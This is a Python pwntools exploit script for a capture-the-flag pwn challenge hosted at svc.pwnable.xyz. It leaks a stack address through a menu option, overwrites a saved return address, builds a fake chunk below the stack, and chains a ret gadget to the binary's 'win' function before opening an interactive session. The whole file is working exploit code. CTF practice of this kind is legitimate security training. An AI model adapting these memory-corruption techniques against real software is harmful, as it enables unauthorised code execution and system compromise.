from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30005

gdbscript = """
set follow-fork-mode child
# b *main+248
# b *main+253
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

STACK = 0

def leak_stack(r):
    r.sendlineafter(b"> ", b"2")

    global STACK
    STACK = int(r.recvline()[2:], 16)
    log.success(f"LEAKED STACK: {hex(STACK)}")
    
def main():
    r  = conn()

    leak_stack(r)
    log.info(f"Overwriting ret addr at {hex(STACK + 0x48)}")
    
    r.sendlineafter(b"> ", b"1")
    r.send(b"A" * 8 + pack(STACK + 0x48))
    r.sendlineafter(b"> ", b"3")
    
    fake_chunk_addr = (STACK & ~15) - 0x1000
    
    log.info(f"Creating fake_chunk at {hex(fake_chunk_addr)}")
    
    fake_chunk = b"A" * 8
    fake_chunk += pack(fake_chunk_addr + 32)
    fake_chunk += pack(0x40) * 2
    
    r.sendlineafter(b"> ", b"1")

    rop = ROP(exe)
    r.send(b"A" * 8 + pack(fake_chunk_addr) + pack(rop.ret.address) + pack(exe.symbols.win))

    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", b"1")
    r.send(fake_chunk)

    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", b"0")
    
    r.interactive()

if __name__ == "__main__":
    main()
